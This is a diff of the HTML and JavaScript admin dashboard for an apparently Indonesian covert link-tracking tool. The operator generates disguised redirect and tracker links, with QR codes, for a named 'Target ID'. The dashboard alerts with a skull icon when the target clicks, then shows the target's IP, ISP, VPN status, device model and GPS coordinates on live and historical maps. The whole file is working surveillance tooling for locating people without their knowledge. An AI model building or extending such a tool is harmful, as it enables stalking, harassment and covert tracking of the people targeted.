@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>:: HACKER-UI DASHBOARD v4.3 (All Features) ::</title>
+    <title>:: HACKER-UI DASHBOARD v6.4 (Final) ::</title>
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
@@ -16,12 +16,15 @@
         #log-section { background: black; border: 1px solid #00ff41; padding: 10px; height: 150px; overflow-y: auto; font-family: monospace; font-size: 14px; margin-top: 20px; }
         #log-section p { margin: 2px 0; }
         .header-actions { display: flex; justify-content: space-between; align-items: center; }
-        /* [START] Style untuk Fitur Baru */
         #advanced-options { display: none; border-left: 2px solid #00ffff; padding-left: 15px; margin-top: 10px;}
         #qr-code-modal .modal-content { max-width: 350px; text-align: center; }
         #qr-code-container { padding: 20px; background: white; margin-bottom: 20px; }
         #qr-code-container img { width: 100% !important; height: auto !important; }
-        /* [END] Style untuk Fitur Baru */
+
+        .feature-panel { border: 1px solid #00ffff; padding: 20px; margin-top: 20px; background-color: rgba(0, 255, 255, 0.05); box-shadow: 0 0 10px #00ffff inset; }
+        .feature-panel h2 { text-align: center; color: #00ffff; text-shadow: 0 0 8px #00ffff; border-bottom: 1px solid #00ffff; padding-bottom: 10px; margin-top: 0; }
+        .flex-container { display: flex; gap: 20px; align-items: flex-start; }
+        .flex-item { flex: 1; }
     </style>
 </head>
 <body>
@@ -31,29 +34,38 @@
             window.location.href = '/login.html';
         }
     </script>
-
     <audio id="notification-sound" src="/sounds/notif.mp3" preload="auto"></audio>
     <div class="dashboard-container">
         <div class="dashboard-panel panel-left">
             <div class="header-actions">
-                <h1 class="main-title" style="margin-bottom:0; border:none;">> CREATE_LINK.OP</h1>
+                <h1 class="main-title" style="margin-bottom:0; border:none;">> ADMIN_DASHBOARD</h1>
                 <button id="logout-btn" class="hacker-button small red">[ LOGOUT ]</button>
             </div>
             <hr style="border-color: #00ffff; margin-top: 10px;">
-            <form id="link-form" class="form-container">
-                <div class="input-group"><label for="original-url">> Enter Default/Desktop URL:</label><input type="url" id="original-url" class="hacker-input" placeholder="https://google.com" required></div>
-                <div class="input-group"><label for="username">> Enter Target ID:</label><input type="text" id="username" class="hacker-input" required></div>
-                
-                <a href="#" id="advanced-toggle" style="color: #00ffff; text-decoration: none;">[ + Opsi Lanjutan ]</a>
-                <div id="advanced-options">
-                    <p style="color:#00ffff; margin-top: 10px;">> Redirects Khusus Perangkat (Opsional)</p>
-                    <div class="input-group"><label for="url-android">> Android URL:</label><input type="url" id="url-android" class="hacker-input" placeholder="https://play.google.com/store/apps/details?id=..."></div>
-                    <div class="input-group"><label for="url-ios">> iOS URL:</label><input type="url" id="url-ios" class="hacker-input" placeholder="https://apps.apple.com/app/..."></div>
+            <div class="flex-container">
+                <div class="flex-item feature-panel">
+                    <h2>> LINK_CREATION.GEN</h2>
+                    <form id="link-form" class="form-container active">
+                        <div class="input-group"><label for="link-type">> Choose Link Type:</label>
+                            <select id="link-type" class="hacker-input">
+                                <option value="direct">Direct Link (Loading Screen)</option>
+                                <option value="intermediate">Tracker Link (Button Clicks)</option>
+                            </select>
+                        </div>
+                        <div class="input-group"><label for="original-url">> Enter Default/Desktop URL:</label><input type="url" id="original-url" class="hacker-input" placeholder="https://google.com" required></div>
+                        <div class="input-group"><label for="username">> Enter Target ID:</label><input type="text" id="username" class="hacker-input" required></div>
+                        <a href="#" id="advanced-toggle" style="color: #00ffff; text-decoration: none;">[ + Opsi Lanjutan ]</a>
+                        <div id="advanced-options">
+                            <p style="color:#00ffff; margin-top: 10px;">> Redirects Khusus Perangkat (Opsional)</p>
+                            <div class="input-group"><label for="url-android">> Android URL:</label><input type="url" id="url-android" class="hacker-input" placeholder="https://play.google.com/store/apps/details?id=..."></div>
+                            <div class="input-group"><label for="url-ios">> iOS URL:</label><input type="url" id="url-ios" class="hacker-input" placeholder="https://apps.apple.com/app/..."></div>
+                        </div>
+                        <div class="input-group" style="margin-top: 15px;"><label for="expires-in">> Set Expiration:</label><select id="expires-in" class="hacker-input"><option value="">Never</option><option value="1">1 Hour</option><option value="24">24 Hours</option><option value="168">7 Days</option></select></div>
+                        <button type="submit" id="submit-btn" class="hacker-button">[ GENERATE ]</button>
+                    </form>
                 </div>
+            </div>
 
-                <div class="input-group" style="margin-top: 15px;"><label for="expires-in">> Set Expiration:</label><select id="expires-in" class="hacker-input"><option value="">Never</option><option value="1">1 Hour</option><option value="24">24 Hours</option><option value="168">7 Days</option></select></div>
-                <button type="submit" id="submit-btn" class="hacker-button">[ GENERATE ]</button>
-            </form>
             <div id="result-box" class="result-box" style="display:none;"></div>
             <h1 class="main-title" style="margin-top: 30px;">> SYSTEM_STATS.LOG</h1>
             <div class="stats-grid">
@@ -68,21 +80,29 @@
             <h1 class="main-title" style="margin-top: 30px;">> LIVE_LOGS.TXT</h1>
             <div id="log-section"></div>
         </div>
+        
         <div class="dashboard-panel panel-right">
-             <div class="header-actions">
-                 <h1 class="main-title" style="margin-bottom:0; border:none;">> LINK_DATABASE.LNK</h1>
-                 <a href="/logs.html" class="hacker-button small" style="text-decoration: none;">[ LIHAT SEMUA LOG ]</a>
-            </div>
+            <h1 class="main-title" style="margin-bottom:0; border:none;">> DIRECT_LINKS.DAT</h1>
             <hr style="border-color: #00ffff; margin-top: 10px;">
-            <div id="links-section"><p class="highlight">> Establishing real-time connection...</p></div>
-        </div>
-    </div>
-    <div id="map-modal" class="modal">
-        <div class="modal-content">
-            <span class="close-btn">×</span>
-            <h2 id="modal-title" class="main-title" style="font-size: 24px;">Location History</h2>
-            <div id="map"></div>
-            <div id="map-actions" style="text-align: center; margin-top: 15px;"></div>
+            <div id="direct-links-section"><p class="highlight">> Establishing connection...</p></div>
+
+            <h1 class="main-title" style="margin-top: 30px;">> TRACKER_LINKS.DAT</h1>
+            <hr style="border-color: #00ffff; margin-top: 10px;">
+            <div id="tracker-links-section"><p class="highlight">> Establishing connection...</p></div>
+            
+            <div id="map-modal" class="modal">
+                <div class="modal-content">
+                    <span class="close-btn">×</span>
+                    <h2 id="modal-title" class="main-title" style="font-size: 24px;">Location History</h2>
+                    <div id="map"></div>
+                    <div id="map-actions" style="text-align: center; margin-top: 15px;"></div>
+                </div>
+            </div>
+
+            <h1 class="main-title" style="margin-top: 30px;">> REALTIME_LOCATION_MAP</h1>
+            <div class="map-container feature-panel">
+                <div id="realtime-map" style="height: 450px;"></div>
+            </div>
         </div>
     </div>
     
@@ -94,6 +114,7 @@
             <a id="qr-download-link" href="#" download="qrcode.png" class="hacker-button">[ UNDUH QR CODE ]</a>
         </div>
     </div>
+    
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const authToken = localStorage.getItem('authToken');
@@ -101,19 +122,81 @@
 
         async function fetchProtected(url, options = {}) {
             const response = await fetch(url, { ...options, headers: { ...options.headers, ...authHeaders } });
-            if (response.status === 401) { 
+            if (response.status === 401) {
                 localStorage.removeItem('authToken');
                 window.location.href = '/login.html';
             }
             return response;
         }
 
-        // Deklarasi Variabel
-        const linksSection = document.getElementById('links-section'), submitBtn = document.getElementById('submit-btn'), resultBox = document.getElementById('result-box'), totalLinksEl = document.getElementById('total-links'), totalClicksEl = document.getElementById('total-clicks'), totalLocationsEl = document.getElementById('total-locations'), modal = document.getElementById('map-modal'), modalTitle = document.getElementById('modal-title'), closeBtn = document.querySelector('.close-btn'), mapActionsDiv = document.getElementById('map-actions'), logSection = document.getElementById('log-section'), logoutBtn = document.getElementById('logout-btn'), linkForm = document.getElementById('link-form'), notificationSound = document.getElementById('notification-sound');
-        const advancedToggle = document.getElementById('advanced-toggle'), advancedOptions = document.getElementById('advanced-options'), qrModal = document.getElementById('qr-code-modal'), qrCloseBtn = document.getElementById('qr-close-btn'), qrContainer = document.getElementById('qr-code-container'), qrDownloadLink = document.getElementById('qr-download-link');
-        let topLinksChart, browserChart, map, markersLayer, isAudioEnabled = false, qrcode = null;
+        function enableAudio() { if(!isAudioEnabled){notificationSound.play().then(()=>{notificationSound.pause(),notificationSound.currentTime=0,isAudioEnabled=!0,console.log("✅ Audio unlocked successfully."),document.body.removeEventListener("click",enableAudio),document.body.removeEventListener("keydown",enableAudio)}).catch(e=>{console.error("❌ Audio unlock failed.",e)})} }
+        document.body.addEventListener('click', enableAudio, { once: !0 });
+        document.body.addEventListener('keydown', enableAudio, { once: !0 });
         
-        // Logika untuk Fitur Baru
+        function showClickNotification(e) { if(isAudioEnabled){notificationSound.currentTime=0,notificationSound.play().catch(e=>console.error("Error playing sound:",e))}else{console.warn("Audio not enabled by user.")}const o=document.createElement("div");o.className="click-notification",o.innerHTML=`<span>💀</span> Target [<strong>${e}</strong>] telah mengakses link!`,document.body.appendChild(o),setTimeout(()=>{o.style.opacity="0",setTimeout(()=>o.remove(),500)},5e3)}
+        
+        const directLinksSection = document.getElementById('direct-links-section');
+        const trackerLinksSection = document.getElementById('tracker-links-section');
+        const resultBox = document.getElementById('result-box');
+        const totalLinksEl = document.getElementById('total-links');
+        const totalClicksEl = document.getElementById('total-clicks');
+        const totalLocationsEl = document.getElementById('total-locations');
+        const logSection = document.getElementById('log-section');
+        const logoutBtn = document.getElementById('logout-btn');
+        const linkForm = document.getElementById('link-form');
+        const advancedToggle = document.getElementById('advanced-toggle');
+        const advancedOptions = document.getElementById('advanced-options');
+        const notificationSound = document.getElementById('notification-sound');
+
+        const modal = document.getElementById('map-modal');
+        const modalTitle = document.getElementById('modal-title');
+        const closeBtn = document.querySelector('.close-btn');
+        const mapActionsDiv = document.getElementById('map-actions');
+        
+        const qrModal = document.getElementById('qr-code-modal');
+        const qrCloseBtn = document.getElementById('qr-close-btn');
+        const qrContainer = document.getElementById('qr-code-container');
+        const qrDownloadLink = document.getElementById('qr-download-link');
+
+        let topLinksChart, browserChart, map, markersLayer, realtimeMap, realtimeMarkersLayer, isAudioEnabled = false, qrcode = null;
+
+        function initModalMap() {
+            if (!map) {
+                const street = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OSM' });
+                const satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', { attribution: '© Esri' });
+                map = L.map('map', { center: [0, 0], zoom: 2, layers: [street] });
+                L.control.layers({ "Street View": street, "Satellite View": satellite }).addTo(map);
+                markersLayer = L.featureGroup().addTo(map);
+            }
+        }
+        
+        function initRealtimeMap() {
+            if (!realtimeMap) {
+                const street = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OSM' });
+                const satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', { attribution: '© Esri' });
+                realtimeMap = L.map('realtime-map', { center: [0, 0], zoom: 2, layers: [street] });
+                L.control.layers({ "Street View": street, "Satellite View": satellite }).addTo(realtimeMap);
+                realtimeMarkersLayer = L.featureGroup().addTo(realtimeMap);
+            }
+        }
+        initRealtimeMap();
+
+        function showQrModal(url) {
+            qrContainer.innerHTML = '';
+            qrModal.style.display = 'block';
+            qrcode = new QRCode(qrContainer, { text: url, width: 256, height: 256, colorDark : "#000000", colorLight : "#ffffff", correctLevel : QRCode.CorrectLevel.H });
+            setTimeout(() => {
+                const canvas = qrContainer.querySelector('canvas');
+                if (canvas) { qrDownloadLink.href = canvas.toDataURL("image/png"); }
+            }, 50);
+        }
+        qrCloseBtn.onclick = () => { qrModal.style.display = "none"; };
+        closeBtn.onclick = () => { modal.style.display = "none" };
+        window.addEventListener('click', (event) => {
+            if (event.target == qrModal) { qrModal.style.display = "none"; }
+            if (event.target == modal) { modal.style.display = "none"; }
+        });
+
         advancedToggle.addEventListener('click', (e) => {
             e.preventDefault();
             const isHidden = advancedOptions.style.display === 'none';
@@ -121,107 +204,162 @@
             e.target.textContent = isHidden ? '[ - Opsi Lanjutan ]' : '[ + Opsi Lanjutan ]';
         });
 
-        function showQrModal(url) {
-            qrContainer.innerHTML = '';
-            qrModal.style.display = 'block';
-            qrcode = new QRCode(qrContainer, { text: url, width: 256, height: 256, colorDark : "#000000", colorLight : "#ffffff", correctLevel : QRCode.CorrectLevel.H });
-            setTimeout(() => {
-                 const canvas = qrContainer.querySelector('canvas');
-                 if (canvas) { qrDownloadLink.href = canvas.toDataURL("image/png"); }
-            }, 50);
-        }
-
-        qrCloseBtn.onclick = () => { qrModal.style.display = "none"; };
-        window.addEventListener('click', (event) => {
-            if (event.target == qrModal) { qrModal.style.display = "none"; }
-            if (event.target == modal) { modal.style.display = "none"; }
-        });
-        
-        // Sisa Logika Aplikasi
-        function enableAudio() { if(!isAudioEnabled){notificationSound.play().then(()=>{notificationSound.pause(),notificationSound.currentTime=0,isAudioEnabled=!0,console.log("✅ Audio unlocked successfully."),document.body.removeEventListener("click",enableAudio),document.body.removeEventListener("keydown",enableAudio)}).catch(e=>{console.error("❌ Audio unlock failed.",e)})} }
-        document.body.addEventListener('click', enableAudio, { once: !0 });
-        document.body.addEventListener('keydown', enableAudio, { once: !0 });
-        
         const socket = io();
 
-        function showClickNotification(e) { if(isAudioEnabled){notificationSound.currentTime=0,notificationSound.play().catch(e=>console.error("Error playing sound:",e))}else{console.warn("Audio not enabled by user.")}const o=document.createElement("div");o.className="click-notification",o.innerHTML=`<span>💀</span> Target [<strong>${e}</strong>] telah mengakses link!`,document.body.appendChild(o),setTimeout(()=>{o.style.opacity="0",setTimeout(()=>o.remove(),500)},5e3)}
+        function updateLinksTables(links = []) {
+            const directLinks = links.filter(link => link.link_type === 'direct');
+            const trackerLinks = links.filter(link => link.link_type !== 'direct');
+
+            if (directLinks.length === 0) {
+                directLinksSection.innerHTML = "<p class='error'>> NO DIRECT LINKS FOUND.</p>";
+            } else {
+                let html = `<table class="hacker-table"><thead><tr><th>Created At</th><th>Link ID</th><th>Target ID</th><th>Clicks</th><th>Last Clicked</th><th>Status</th><th>Aksi</th></tr></thead><tbody>`;
+                directLinks.forEach(r => {
+                    const linkUrl = `${window.location.protocol}//${window.location.host}/${r.id}`;
+                    const isExpired = r.expires_at && new Date(r.expires_at) < new Date();
+                    const statusClass = isExpired ? 'error' : 'highlight';
+                    const statusText = isExpired ? 'EXPIRED' : 'ACTIVE';
+                    let mapButton = `<button class="hacker-button small" disabled>[ MAP ]</button>`;
+                    if (r.click_count > 0) { mapButton = `<button class="hacker-button small" onclick="showMapModal('${r.id}', '${r.username}')">[ MAP ]</button>`; }
+                    const qrButton = `<button class="hacker-button small" onclick="showQrModal('${linkUrl}')">[ QR ]</button>`;
+                    const deleteButton = `<button class="hacker-button small red" onclick="deleteLink('${r.id}', '${r.username}')">[ HAPUS ]</button>`;
+                    html += `<tr><td>${new Date(r.created_at).toLocaleString('id-ID')}</td><td><a href="${linkUrl}" target="_blank">${r.id}</a></td><td class="highlight">${r.username}</td><td class="highlight">${r.click_count}</td><td>${r.last_clicked_at ? new Date(r.last_clicked_at).toLocaleString('id-ID') : 'Never'}</td><td class="${statusClass}">${statusText}</td><td class="action-buttons">${mapButton} ${qrButton} ${deleteButton}</td></tr>`;
+                });
+                html += "</tbody></table>";
+                directLinksSection.innerHTML = html;
+            }
+
+            if (trackerLinks.length === 0) {
+                trackerLinksSection.innerHTML = "<p class='error'>> NO TRACKER LINKS FOUND.</p>";
+            } else {
+                let html = `<table class="hacker-table"><thead><tr><th>Created At</th><th>Link ID</th><th>Target ID</th><th>Clicks</th><th>Last Location</th><th>Status</th><th>Aksi</th></tr></thead><tbody>`;
+                trackerLinks.forEach(r => {
+                    const linkUrl = `${window.location.protocol}//${window.location.host}/${r.id}`;
+                    const isExpired = r.expires_at && new Date(r.expires_at) < new Date();
+                    const statusClass = isExpired ? 'error' : 'highlight';
+                    const statusText = isExpired ? 'EXPIRED' : 'ACTIVE';
+                    let mapButton = `<button class="hacker-button small" disabled>[ MAP ]</button>`;
+                    if (r.city || r.country) { 
+                        mapButton = `<button class="hacker-button small" onclick="showMapModal('${r.id}', '${r.username}')">[ MAP ]</button>`; 
+                    }
+                    const qrButton = `<button class="hacker-button small" onclick="showQrModal('${linkUrl}')">[ QR ]</button>`;
+                    const deleteButton = `<button class="hacker-button small red" onclick="deleteLink('${r.id}', '${r.username}')">[ HAPUS ]</button>`;
+                    const locationText = r.city && r.country ? `${r.city}, ${r.country}` : 'N/A';
+                    html += `<tr><td>${new Date(r.created_at).toLocaleString('id-ID')}</td><td><a href="${linkUrl}" target="_blank">${r.id}</a></td><td class="highlight">${r.username}</td><td class="highlight">${r.click_count}</td><td class="highlight">${locationText}</td><td class="${statusClass}">${statusText}</td><td class="action-buttons">${mapButton} ${qrButton} ${deleteButton}</td></tr>`;
+                });
+                html += "</tbody></table>";
+                trackerLinksSection.innerHTML = html;
+            }
+        }
         
-        function updateLinksTable(links = []) {
-            if (links.length === 0) { linksSection.innerHTML = "<p class='error'>> NO LINKS FOUND.</p>"; return; }
-            let html = `<table class="hacker-table"><thead><tr><th>Created At</th><th>Link ID</th><th>Target ID</th><th>Kota</th><th>Negara</th><th>Clicks</th><th>Last Clicked</th><th>Status</th><th>Aksi</th></tr></thead><tbody>`;
-            links.forEach(r => {
-                const linkUrl = `${window.location.protocol}//${window.location.host}/${r.id}`;
-                const isExpired = r.expires_at && new Date(r.expires_at) < new Date();
-                const statusClass = isExpired ? 'error' : 'highlight';
-                const statusText = isExpired ? 'EXPIRED' : 'ACTIVE';
-                let mapButton = `<button class="hacker-button small" disabled>[ MAP ]</button>`;
-                if (r.click_count > 0) { mapButton = `<button class="hacker-button small" onclick="showMapModal('${r.id}', '${r.username}')">[ MAP ]</button>`; }
-                const qrButton = `<button class="hacker-button small" onclick="showQrModal('${linkUrl}')">[ QR ]</button>`;
-                const deleteButton = `<button class="hacker-button small red" onclick="deleteLink('${r.id}', '${r.username}')">[ HAPUS ]</button>`;
-                const cityText = r.city || (r.click_count > 0 ? 'Processing...' : 'N/A');
-                const countryText = r.country || (r.click_count > 0 ? '...' : 'N/A');
-                html += `<tr><td>${new Date(r.created_at).toLocaleString('id-ID')}</td><td><a href="${linkUrl}" target="_blank">${r.id}</a></td><td class="highlight">${r.username}</td><td class="highlight">${cityText}</td><td class="highlight">${countryText}</td><td class="highlight">${r.click_count}</td><td>${r.last_clicked_at ? new Date(r.last_clicked_at).toLocaleString('id-ID') : 'Never'}</td><td class="${statusClass}">${statusText}</td><td class="action-buttons">${mapButton} ${qrButton} ${deleteButton}</td></tr>`;
-            });
-            html += "</tbody></table>";
-            linksSection.innerHTML = html;
+        async function showMapModal(id, name) {
+            console.log(`> Memuat data lokasi untuk link ID: ${id}`);
+            initModalMap();
+            modal.style.display = "block"; 
+            modalTitle.textContent = `> Location History for: ${name}`;
+            setTimeout(() => map.invalidateSize(), 1); 
+            markersLayer.clearLayers(); 
+            mapActionsDiv.innerHTML = '';
+            try {
+                const response = await fetchProtected(`/api/locations/${id}`); 
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                const locations = await response.json();
+                console.log(`> Data lokasi yang diterima:`, locations);
+
+                if (locations && locations.length > 0) {
+                    const validLocations = locations.filter(loc => loc.latitude != null && loc.longitude != null);
+                    if (validLocations.length > 0) {
+                        validLocations.forEach(loc => {
+                            const marker = L.marker([loc.latitude, loc.longitude]); 
+                            const locationString = (loc.city && loc.country) ? `${loc.city}, ${loc.country}` : 'Location unknown';
+                            marker.bindPopup(`<b>${new Date(loc.created_at).toLocaleString('id-ID')}</b><br><strong>${locationString}</strong><br><br><strong>IP:</strong> ${loc.ip_address}<br><strong>ISP:</strong> ${loc.isp || 'N/A'}<br><strong>Organisasi:</strong> ${loc.org || 'N/A'}<br><strong>Proxy/VPN:</strong> ${loc.proxy ? '<span class="error">Yes</span>' : 'No'}<br><br><strong>Device:</strong> ${loc.browser} on ${loc.os}<br>(${loc.device.type} - ${loc.device.vendor} ${loc.device.model})`);
+                            markersLayer.addLayer(marker);
+                        });
+                        const latestLocation = validLocations[0]; 
+                        const googleMapsUrl = `https://www.google.com/maps?q=$${latestLocation.latitude},${latestLocation.longitude}`;
+                        mapActionsDiv.innerHTML = `<a href="${googleMapsUrl}" target="_blank" class="hacker-button">[ LIHAT LEBIH DETAIL DI GOOGLE MAPS ]</a>`; 
+                        map.fitBounds(markersLayer.getBounds());
+                    } else {
+                        console.log("> Tidak ada lokasi valid yang ditemukan, menampilkan pesan.");
+                        mapActionsDiv.innerHTML = `<p class="error">Tidak ada data lokasi yang valid untuk link ini.</p>`;
+                        map.setView([0, 0], 2);
+                    }
+                } else { 
+                    console.log("> Array lokasi kosong, menampilkan pesan.");
+                    mapActionsDiv.innerHTML = `<p class="error">Tidak ada data lokasi yang ditemukan untuk link ini.</p>`;
+                    map.setView([0, 0], 2);
+                }
+            } catch (err) { 
+                console.error("❌ Gagal mengambil data lokasi:", err);
+                mapActionsDiv.innerHTML = `<p class="error">Gagal memuat data lokasi. Error: ${err.message}</p>`;
+                map.setView([0, 0], 2);
+            }
         }
 
         function updateStats(e) { totalLinksEl.textContent = e.total_links || 0, totalClicksEl.textContent = e.total_clicks || 0, totalLocationsEl.textContent = e.total_locations || 0 }
         function updateTopLinksChart(e = []) { const o = document.getElementById('topLinksChart').getContext('2d'), t = [...e].sort((e, o) => o.click_count - e.click_count).slice(0, 5), a = t.map(e => e.id), n = t.map(e => e.click_count); topLinksChart ? (topLinksChart.data.labels = a, topLinksChart.data.datasets[0].data = n, topLinksChart.update()) : topLinksChart = new Chart(o, { type: 'bar', data: { labels: a, datasets: [{ label: 'Total Clicks', data: n, backgroundColor: 'rgba(0,255,65,0.5)', borderColor: '#00ff41', borderWidth: 1 }] }, options: { indexAxis: 'y', scales: { x: { ticks: { color: '#00ff41' } }, y: { ticks: { color: '#00ff41' } } }, plugins: { legend: { display: !1 } } } }) }
         function updateBrowserChart(e = {}) { const o = document.getElementById('browserChart').getContext('2d'), t = Object.keys(e), a = Object.values(e); browserChart ? (browserChart.data.labels = t, browserChart.data.datasets[0].data = a, browserChart.update()) : browserChart = new Chart(o, { type: 'pie', data: { labels: t, datasets: [{ data: a, backgroundColor: ['#00ff41', '#ff0041', '#41aaff', '#ffaa00', '#888888'] }] }, options: { plugins: { legend: { labels: { color: '#00ff41' } } } } }) }
-        
+
         async function deleteLink(e, o) { if (confirm(`Anda yakin ingin menghapus link untuk target '${o}' (${e})?\n\nSemua data lokasi terkait juga akan dihapus permanen!`)) try { const response = await fetchProtected(`/api/links/${e}`, { method: 'DELETE' }); if (!response.ok) throw new Error('Gagal menghapus link.') } catch (e) { alert(`Error: ${e.message}`) } }
         
-        async function showMapModal(id, name) {
-            modal.style.display = "block"; modalTitle.textContent = `> Location History for: ${name}`;
-            if (!map) {
-                const street = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OSM' }); const satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', { attribution: '© Esri' }); map = L.map('map', { center: [-2.5489, 118.0149], zoom: 5, layers: [street] }); L.control.layers({ "Street View": street, "Satellite View": satellite }).addTo(map); markersLayer = L.featureGroup().addTo(map);
-            }
-            setTimeout(() => map.invalidateSize(), 1); markersLayer.clearLayers(); mapActionsDiv.innerHTML = '';
-            try {
-                const response = await fetchProtected(`/api/locations/${id}`); const locations = await response.json();
-                if (locations && locations.length > 0) {
-                    locations.forEach(loc => {
-                        const marker = L.marker([loc.latitude, loc.longitude]); const locationString = (loc.city && loc.country) ? `${loc.city}, ${loc.country}` : 'Location unknown';
-                        marker.bindPopup(`<b>${new Date(loc.created_at).toLocaleString('id-ID')}</b><br><strong>${locationString}</strong><br><br><strong>IP:</strong> ${loc.ip_address}<br><strong>ISP:</strong> ${loc.isp || 'N/A'}<br><strong>Organisasi:</strong> ${loc.org || 'N/A'}<br><strong>Proxy/VPN:</strong> ${loc.proxy ? '<span class="error">Yes</span>' : 'No'}<br><br><strong>Device:</strong> ${loc.browser} on ${loc.os}<br>(${loc.device.type} - ${loc.device.vendor} ${loc.device.model})`);
-                        markersLayer.addLayer(marker);
-                    });
-                    const latestLocation = locations[0]; const googleMapsUrl = `https://www.google.com/maps?q=$${latestLocation.latitude},${latestLocation.longitude}`;
-                    mapActionsDiv.innerHTML = `<a href="${googleMapsUrl}" target="_blank" class="hacker-button">[ LIHAT LEBIH DETAIL DI GOOGLE MAPS ]</a>`; map.fitBounds(markersLayer.getBounds());
-                } else { alert("No location data found for this link."); }
-            } catch (err) { alert("Failed to fetch location data."); }
-        }
-
         socket.on('connect', () => {
             console.log('✅ Terhubung ke server via WebSocket!');
             socket.emit('request_initial_data', { token: authToken });
         });
-        socket.on('dashboard_update', e => { updateLinksTable(e.links), updateStats(e.stats), updateTopLinksChart(e.links), updateBrowserChart(e.browserStats) });
-        socket.on('new_log_message', e => { const o = document.createElement('p'); o.textContent = e, logSection.appendChild(o), logSection.scrollTop = logSection.scrollHeight });
+        socket.on('dashboard_update', e => {
+            updateLinksTables(e.links);
+            updateStats(e.stats);
+            updateTopLinksChart(e.links);
+            updateBrowserChart(e.browserStats);
+        });
+        socket.on('new_log_message', e => {
+            const o = document.createElement('p'); o.textContent = e;
+            logSection.appendChild(o);
+            logSection.scrollTop = logSection.scrollHeight;
+        });
         socket.on('link_clicked', e => { showClickNotification(e.username) });
         
-        linkForm.addEventListener('submit', async e => { 
-            e.preventDefault(); submitBtn.textContent = "[ ...PROCESSING... ]"; submitBtn.disabled = true;
-            try { 
-                const body = { username: document.getElementById('username').value, originalUrl: document.getElementById('original-url').value, url_android: document.getElementById('url-android').value, url_ios: document.getElementById('url-ios').value, expiresIn: document.getElementById('expires-in').value };
+        socket.on('new_location_logged', (newLocation) => {
+            console.log('📍 Lokasi baru diterima secara real-time:', newLocation);
+            const marker = L.marker([newLocation.latitude, newLocation.longitude]);
+            const locationString = (newLocation.city && newLocation.country) ? `${newLocation.city}, ${newLocation.country}` : 'Location unknown';
+            marker.bindPopup(`<b>${newLocation.username}</b><br>${new Date(newLocation.created_at).toLocaleString('id-ID')}<br><strong>${locationString}</strong>`);
+            realtimeMarkersLayer.addLayer(marker);
+            realtimeMap.panTo([newLocation.latitude, newLocation.longitude]);
+        });
+        
+        linkForm.addEventListener('submit', async e => {
+            e.preventDefault();
+            const submitBtn = document.getElementById('submit-btn');
+            submitBtn.textContent = "[ ...PROCESSING... ]"; submitBtn.disabled = true;
+            try {
+                const body = {
+                    username: document.getElementById('username').value,
+                    originalUrl: document.getElementById('original-url').value,
+                    url_android: document.getElementById('url-android').value,
+                    url_ios: document.getElementById('url-ios').value,
+                    expiresIn: document.getElementById('expires-in').value,
+                    linkType: document.getElementById('link-type').value
+                };
                 const response = await fetchProtected('/create', { method: 'POST', body: JSON.stringify(body) });
                 const o = await response.json();
                 if (o.newLink) {
-                    resultBox.style.display = 'block'; resultBox.innerHTML = `<p>> LINK GENERATED FOR <span class="highlight">${o.username}</span>: <a href="${o.newLink}" target="_blank">${o.newLink}</a></p>`; linkForm.reset(); advancedOptions.style.display = 'none'; advancedToggle.textContent = '[ + Opsi Lanjutan ]';
+                    resultBox.style.display = 'block'; resultBox.innerHTML = `<p>> LINK GENERATED FOR <span class="highlight">${o.username}</span>: <a href="${o.newLink}" target="_blank">${o.newLink}</a></p>`;
+                    linkForm.reset(); advancedOptions.style.display = 'none'; advancedToggle.textContent = '[ + Opsi Lanjutan ]';
                 } else { throw new Error(o.error || o.message); }
-            } catch (e) { 
+            } catch (e) {
                 resultBox.style.display = 'block'; resultBox.innerHTML = `<p class="error">> ERROR: ${e.message}</p>`;
-            } finally { 
+            } finally {
                 submitBtn.textContent = "[ GENERATE ]"; submitBtn.disabled = false;
-            } 
+            }
         });
 
         logoutBtn.addEventListener('click', () => {
             localStorage.removeItem('authToken');
             window.location.href = '/login.html';
         });
-        
-        closeBtn.onclick = () => { modal.style.display = "none" };
     </script>
 </body>
 </html>
